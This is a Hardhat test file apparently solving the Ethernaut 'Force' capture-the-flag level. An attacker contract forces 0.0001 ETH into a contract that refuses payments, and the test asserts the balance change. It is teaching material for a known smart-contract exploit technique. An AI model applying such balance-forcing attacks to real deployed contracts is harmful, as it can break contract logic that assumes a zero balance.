import { Contract } from "@ethersproject/contracts";
import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers";
import { expect } from "chai";
import { ethers } from "hardhat";
import { toWei } from "scripts/utils";
import { ForceAttacker } from "typechain-types/ForceAttacker";

// Challenge description

// Some contracts will simply not take your money ¯\_(ツ)_/¯
// The goal of this level is to make the balance of the contract greater than zero.
// Things that might help:
// - Fallback methods
// - Sometimes the best way to attack a contract is with another contract.

describe("Ethernaut - Force", async () => {
  let force: Contract;
  let forceAttacker: ForceAttacker;
  let owner: SignerWithAddress, attacker: SignerWithAddress;

  before(async () => {
    [owner, attacker] = await ethers.getSigners();
    force = await ethers
      .getContractFactory("Force", owner)
      .then((f) => f.deploy());
    forceAttacker = await ethers
      .getContractFactory("ForceAttacker", attacker)
      .then((f) => f.deploy());
  });

  it("Hacks", async () => {
    expect(await ethers.provider.getBalance(force.address)).equal(0);

    await forceAttacker
      .connect(attacker)
      .sendEth(force.address, { value: toWei("0.0001") });

    expect(await ethers.provider.getBalance(force.address)).equal(
      toWei("0.0001"),
    );
  });
});
